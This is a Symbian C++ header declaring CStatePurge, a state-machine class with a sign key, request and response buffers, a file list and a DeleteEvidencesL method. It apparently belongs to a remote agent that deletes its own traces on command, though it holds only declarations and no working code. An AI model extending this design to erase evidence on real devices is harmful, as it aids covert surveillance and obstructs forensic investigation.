/*
 * StatePurge.h
 *
 *  Created on: 11/gen/2013
 *      Author: Giovanna
 */

#ifndef STATEPURGE_H_
#define STATEPURGE_H_

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include "AbstractState.h"

// CLASS DECLARATION


/**
 *  CStatePurge
 * 
 */
class CStatePurge : public CAbstractState
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CStatePurge();

	/**
	 * Two-phased constructor.
	 */
	static CStatePurge* NewL(MStateObserver& aObserver);

	/**
	 * Two-phased constructor.
	 */
	static CStatePurge* NewLC(MStateObserver& aObserver);

	virtual void ActivateL(const TDesC8& aData);   
	virtual void ProcessDataL(const TDesC8& aData);
	
private:

	/**
	 * Constructor for performing 1st stage construction
	 */
	CStatePurge(MStateObserver& aObserver);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL();
	
	void DeleteEvidencesL(const TDesC8& aParams);
	
private:
	
	TBuf8<16>	iSignKey;
	HBufC8*		iRequestData;
	HBufC8*		iResponseData; //response data
	
	RPointerArray<HBufC> iFileList;
		
	};

#endif /* STATEPURGE_H_ */
